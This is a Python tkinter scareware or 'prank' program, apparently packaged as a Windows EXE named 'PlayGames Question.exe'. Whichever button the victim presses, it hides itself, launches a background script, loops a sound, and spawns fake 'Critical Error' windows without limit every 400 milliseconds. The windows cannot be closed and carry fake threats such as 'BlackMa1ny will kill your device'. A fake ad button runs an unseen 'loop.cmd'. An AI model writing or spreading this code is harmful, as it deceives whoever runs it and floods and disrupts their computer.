import tkinter as tk
import subprocess
import random
import os
import sys  # Requis pour localiser le dossier temporaire de l'EXE
import winsound

class CrazyWindow:
    def __init__(self, master, title_text, msg_text, move_type):
        self.win = tk.Toplevel(master)
        self.win.title(title_text)
        self.win.geometry("340x140")
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        
        self.win.configure(bg='#001100')
        lbl = tk.Label(self.win, text=msg_text, font=("Arial", 10, "bold"), fg="#00FF00", bg="#001100")
        lbl.pack(pady=25)
        
        self.sw = self.win.winfo_screenwidth()
        self.sh = self.win.winfo_screenheight()
        self.x = random.randint(100, max(100, self.sw - 400))
        self.y = random.randint(100, max(100, self.sh - 200))
        
        self.move_type = move_type
        self.speed_x = random.choice([-18, -12, 12, 18])
        self.speed_y = random.choice([-18, -12, 12, 18])
        self.animate()

    def animate(self):
        if self.move_type == 'left-right':
            self.x += self.speed_x
            if self.x <= 0 or self.x >= self.sw - 340:
                self.speed_x = -self.speed_x
        elif self.move_type == 'up-down':
            self.y += self.speed_y
            if self.y <= 0 or self.y >= self.sh - 140:
                self.speed_y = -self.speed_y
        elif self.move_type == 'random':
            self.x += self.speed_x + random.randint(-5, 5)
            self.y += self.speed_y + random.randint(-5, 5)
            if self.x <= 0 or self.x >= self.sw - 340:
                self.speed_x = -self.speed_x
            if self.y <= 0 or self.y >= self.sh - 140:
                self.speed_y = -self.speed_y

        try:
            self.win.geometry(f"+{self.x}+{self.y}")
            self.win.after(15, self.animate)
        except:
            pass

def get_resource_path(relative_path):
    """ Récupère le chemin d'un fichier, qu'il soit exécuté normalement ou extrait par l'EXE """
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

def start_the_trap():
    root.withdraw()
    
    # Recherche locale simple pour le compteur externe en tâche de fond
    if os.path.exists("compteur.py"):
        subprocess.Popen(["python", "compteur.py"])
        
    root.after(2000, trigger_chaos)

def trigger_chaos():
    # On va chercher le chemin du WAV qui est soudé à l'intérieur de l'EXE
    sound_path = get_resource_path("MEME.wav")
    
    if os.path.exists(sound_path):
        winsound.PlaySound(sound_path, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP)
        
    spawn_moving_errors()
    spawn_ad_window()

def spawn_moving_errors():
    error_messages = [
        "⚠️ BlackMa1ny Detected (-99)",
        "💀 BlackMa1ny will kill your device",
        "⚠️ Cannot Chase Me....",
        "❌ You Couldn't catch me because you are an IDIOT !",
        "🚫 ERROR 404: Hacker Not Found",
        "⚠️ Chase me if you can !"
    ]
    chosen_movement = random.choice(['left-right', 'up-down', 'random'])
    chosen_msg = random.choice(error_messages)
    CrazyWindow(root, "Critical Error", chosen_msg, chosen_movement)
    root.after(400, spawn_moving_errors)

def spawn_ad_window():
    ad_win = tk.Toplevel()
    ad_win.title("Ad.exe")
    ad_win.geometry("400x180")
    ad_win.configure(bg="#111111")
    ad_win.protocol("WM_DELETE_WINDOW", lambda: None)
    ad_win.eval('tk::PlaceWindow . center')
    
    lbl_ad = tk.Label(ad_win, text="🔥 EXCLUSIVE VIDEO ! 🔥\nWatch this Video right now !", font=("Arial", 12, "bold"), fg="#00FF00", bg="#111111")
    lbl_ad.pack(pady=25)
    btn_watch = tk.Button(ad_win, text="WATCH 🎥", font=("Arial", 11, "bold"), bg="red", fg="white", width=15, command=trigger_cmd_loop_trap)
    btn_watch.pack(pady=10)

def trigger_cmd_loop_trap():
    if os.path.exists("loop.cmd"):
        os.system("start loop.cmd")

# --- INTERFACE PRINCIPALE ---
root = tk.Tk()
root.title("PlayGames Question.exe")
root.geometry("380x160")
root.eval('tk::PlaceWindow . center')

lbl_question = tk.Label(root, text="Would you like to Play with Me ?", font=("Arial", 13, "bold"))
lbl_question.pack(pady=25)

frame_btns = tk.Frame(root)
frame_btns.pack()

tk.Button(frame_btns, text="Yes", width=12, command=start_the_trap).pack(side=tk.LEFT, padx=15)
tk.Button(frame_btns, text="No", width=12, command=start_the_trap).pack(side=tk.RIGHT, padx=15)

root.mainloop()